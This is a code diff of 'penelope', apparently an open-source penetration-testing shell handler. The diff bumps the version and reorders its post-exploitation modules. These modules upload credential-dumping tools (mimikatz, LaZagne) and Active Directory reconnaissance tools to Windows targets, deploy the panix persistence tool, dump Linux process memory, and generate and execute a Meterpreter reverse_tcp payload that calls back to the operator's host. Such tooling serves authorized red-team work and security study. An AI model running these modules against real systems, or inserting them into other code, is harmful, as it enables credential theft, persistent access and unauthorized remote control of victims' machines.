@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.15.1"
+__version__ = "0.15.2"
 
 import os
 import io
@@ -4448,46 +4448,87 @@ class traitor(Module):
 			logger.error("This module runs only on Unix shells")
 
 
-class panix(Module):
-	category = "Persistence"
+class upload_credump_scripts(Module):
+	category = "Credential Dumping"
 	def run(session, args):
 		"""
-		Upload the latest version of panix to the target
+		Upload mimikatz, LaZagne, Snaffler, SharpWeb to the Windows target
 		"""
 		if session.OS == 'Unix':
-			session.upload(URLS['panix'])
+			logger.error("This module runs only on Windows shells")
+
+		elif session.OS == 'Windows':
+			session.upload(URLS['mimikatz'])
+			session.upload(URLS['lazagne'])
+			session.upload(URLS['snaffler'])
+			session.upload(URLS['sharpweb'])
+
+
+class upload_ad_scripts(Module):
+	category = "Active Directory"
+	def run(session, args):
+		"""
+		Upload SharpHound, Powerview, GhostPack collection to the Windows target
+		"""
+		if session.OS == 'Unix':
+			logger.error("This module runs only on Windows shells")
+
+		elif session.OS == 'Windows':
+			session.upload(URLS['sharphound'])
+			session.upload(URLS['powerview'])
+			session.upload(URLS['ghostpack'])
+
+
+class uac(Module):
+	category = "Forensics"
+	def run(session, args):
+		"""
+		Acquire forensic data Unix systems using UAC (Unix-like Artifacts Collector) in the background
+		"""
+		if session.OS == 'Unix':
+			if not session.system == 'Linux':
+				logger.error(f"This modules runs only on Linux, not on {session.system}.")
+				return False
+			path = session.upload(URLS['uac_linux'], remote_path=session.tmp)[0]
+			result = session.exec(f"tar xf {path} -C {session.tmp} >/dev/null", value=True)
+			if not result:
+				logger.info(f"UAC successfully extracted on {session.tmp}")
+			else:
+				logger.error(f"Extraction to {session.tmp} failed:\n{indent(result, ' ' * 4 + '- ')}")
+				return False
+		#	UAC artifacts or profiles can be set by changing the arguments, e.g.:  /uac -u -a './artifacts/live_response/network*' --output-format tar {session.tmp}
+			logger.info(f"root user check is disabled. Data collection may be limited. It will WRITE the output on the remote file system.")
+			cmd = f"cd {path.removesuffix('.tar.gz')}; ./uac -u -p ir_triage --output-format tar {session.tmp}"
+			#session.exec(cmd)
+			tf = f"/tmp/{rand(8)}"
+			with open(tf, "w") as f:
+				f.write("#!/bin/sh\n")
+				f.write(cmd)
+			logger.info(f"UAC output will be stored at {session.tmp}/uac-%hostname%-%os%-%timestamp%")
+			session.script(tf)
+		#	Once completed, transfer the output files to your host
 		else:
 			logger.error("This module runs only on Unix shells")
 
 
-class meterpreter(Module):
+class linux_procmemdump(Module):
+	category = "Forensics"
 	def run(session, args):
 		"""
-		Get a meterpreter shell
+		Dump process memory in the background (requires root)
 		"""
 		if session.OS == 'Unix':
-			logger.error("This module runs only on Windows shells")
+			if not session.system == 'Linux':
+				logger.error(f"This modules runs only on Linux, not on {session.system}.")
+				return False
+			session.upload(URLS['linux_procmemdump'], remote_path=session.tmp)
+			print(session.exec(f"ps -eo pid,cmd", value=True))
+			logger.info(f"Please provide the PID of the process to be acquired:")
+			PID = input("PID: ")
+			session.exec(f"{session.tmp}/linux_procmemdump.sh -p {PID} -s -d {session.tmp}")
+			logger.info(f"Strings of the process dump will be stored at {session.tmp}/{PID}/")
 		else:
-			payload_path = f"/dev/shm/{rand(10)}.exe"
-			host = session._host
-			port = 5555
-			payload_creation_cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe > {payload_path}"
-			result = subprocess.run(payload_creation_cmd, shell=True, text=True, capture_output=True)
-
-			if result.returncode == 0:
-				logger.info("Payload created!")
-				uploaded_path = session.upload(payload_path)
-				if uploaded_path:
-					meterpreter_handler_cmd = (
-						'msfconsole -x "use exploit/multi/handler; '
-						'set payload windows/meterpreter/reverse_tcp; '
-						f'set LHOST {host}; set LPORT {port}; run"'
-					)
-					Open(meterpreter_handler_cmd, terminal=True)
-					print(meterpreter_handler_cmd)
-					session.exec(uploaded_path[0])
-			else:
-				logger.error(f"Cannot create meterpreter payload: {result.stderr}")
+			logger.error("This module runs only on Unix shells")
 
 
 class ligolo(Module):
@@ -4576,87 +4617,46 @@ class ngrok(Module):
 			logger.error("This module runs only on Unix shells")
 
 
-class uac(Module):
-	category = "Forensics"
+class panix(Module):
+	category = "Persistence"
 	def run(session, args):
 		"""
-		Acquire forensic data Unix systems using UAC (Unix-like Artifacts Collector) in the background
+		Upload the latest version of panix to the target
 		"""
 		if session.OS == 'Unix':
-			if not session.system == 'Linux':
-				logger.error(f"This modules runs only on Linux, not on {session.system}.")
-				return False
-			path = session.upload(URLS['uac_linux'], remote_path=session.tmp)[0]
-			result = session.exec(f"tar xf {path} -C {session.tmp} >/dev/null", value=True)
-			if not result:
-				logger.info(f"UAC successfully extracted on {session.tmp}")
+			session.upload(URLS['panix'])
+		else:
+			logger.error("This module runs only on Unix shells")
+
+
+class meterpreter(Module):
+	def run(session, args):
+		"""
+		Get a meterpreter shell
+		"""
+		if session.OS == 'Unix':
+			logger.error("This module runs only on Windows shells")
+		else:
+			payload_path = f"/dev/shm/{rand(10)}.exe"
+			host = session._host
+			port = 5555
+			payload_creation_cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe > {payload_path}"
+			result = subprocess.run(payload_creation_cmd, shell=True, text=True, capture_output=True)
+
+			if result.returncode == 0:
+				logger.info("Payload created!")
+				uploaded_path = session.upload(payload_path)
+				if uploaded_path:
+					meterpreter_handler_cmd = (
+						'msfconsole -x "use exploit/multi/handler; '
+						'set payload windows/meterpreter/reverse_tcp; '
+						f'set LHOST {host}; set LPORT {port}; run"'
+					)
+					Open(meterpreter_handler_cmd, terminal=True)
+					print(meterpreter_handler_cmd)
+					session.exec(uploaded_path[0])
 			else:
-				logger.error(f"Extraction to {session.tmp} failed:\n{indent(result, ' ' * 4 + '- ')}")
-				return False
-		#	UAC artifacts or profiles can be set by changing the arguments, e.g.:  /uac -u -a './artifacts/live_response/network*' --output-format tar {session.tmp}
-			logger.info(f"root user check is disabled. Data collection may be limited. It will WRITE the output on the remote file system.")
-			cmd = f"cd {path.removesuffix('.tar.gz')}; ./uac -u -p ir_triage --output-format tar {session.tmp}"
-			#session.exec(cmd)
-			tf = f"/tmp/{rand(8)}"
-			with open(tf, "w") as f:
-				f.write("#!/bin/sh\n")
-				f.write(cmd)
-			logger.info(f"UAC output will be stored at {session.tmp}/uac-%hostname%-%os%-%timestamp%")
-			session.script(tf)
-		#	Once completed, transfer the output files to your host
-		else:
-			logger.error("This module runs only on Unix shells")
-
-
-class linux_procmemdump(Module):
-	category = "Forensics"
-	def run(session, args):
-		"""
-		Dump process memory in the background (requires root)
-		"""
-		if session.OS == 'Unix':
-			if not session.system == 'Linux':
-				logger.error(f"This modules runs only on Linux, not on {session.system}.")
-				return False
-			session.upload(URLS['linux_procmemdump'], remote_path=session.tmp)
-			print(session.exec(f"ps -eo pid,cmd", value=True))
-			logger.info(f"Please provide the PID of the process to be acquired:")
-			PID = input("PID: ")
-			session.exec(f"{session.tmp}/linux_procmemdump.sh -p {PID} -s -d {session.tmp}")
-			logger.info(f"Strings of the process dump will be stored at {session.tmp}/{PID}/")
-		else:
-			logger.error("This module runs only on Unix shells")
-
-
-class upload_ad_scripts(Module):
-	category = "Active Directory"
-	def run(session, args):
-		"""
-		Upload SharpHound, Powerview, GhostPack collection to the Windows target
-		"""
-		if session.OS == 'Unix':
-			logger.error("This module runs only on Windows shells")
-
-		elif session.OS == 'Windows':
-			session.upload(URLS['sharphound'])
-			session.upload(URLS['powerview'])
-			session.upload(URLS['ghostpack'])
-
-
-class upload_credump_scripts(Module):
-	category = "Credential Dumping"
-	def run(session, args):
-		"""
-		Upload mimikatz, LaZagne, Snaffler, SharpWeb to the Windows target
-		"""
-		if session.OS == 'Unix':
-			logger.error("This module runs only on Windows shells")
-
-		elif session.OS == 'Windows':
-			session.upload(URLS['mimikatz'])
-			session.upload(URLS['lazagne'])
-			session.upload(URLS['snaffler'])
-			session.upload(URLS['sharpweb'])
+				logger.error(f"Cannot create meterpreter payload: {result.stderr}")
 
 
 class FileServer:
